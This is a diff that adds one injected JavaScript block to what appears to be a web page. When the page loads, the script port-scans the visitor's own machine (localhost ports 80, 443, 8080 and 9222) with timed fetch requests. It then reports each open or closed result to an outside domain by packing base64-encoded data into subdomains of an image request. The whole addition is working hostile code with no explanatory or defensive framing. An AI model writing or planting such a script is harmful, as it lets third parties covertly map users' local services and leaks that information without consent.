@@ -1,0 +1,30 @@
+<script>
+  const exfilDomain = 'cx3ch13y3e5s.dssldrf.net';
+  const targets = [
+    { host: '127.0.0.1', port: 80 },
+    { host: '127.0.0.1', port: 443 },
+    { host: '127.0.0.1', port: 8080 },
+    { host: '127.0.0.1', port: 9222 }
+  ];
+  
+  function exfiltrate(data) {
+    const encodedData = btoa(data).replace(/=/g, '');
+    new Image().src = `http://${encodedData}.${exfilDomain}`;
+  }
+  
+  targets.forEach(target => {
+    const url = `http://${target.host}:${target.port}`;
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 2000);
+    
+    fetch(url, { signal: controller.signal })
+    .then(response => {
+      clearTimeout(timeoutId);
+      exfiltrate(`${target.host}:${target.port}:OPEN`);
+    })
+    .catch(error => {
+      clearTimeout(timeoutId);
+      exfiltrate(`${target.host}:${target.port}:CLOSED`);
+    });
+  });
+</script>
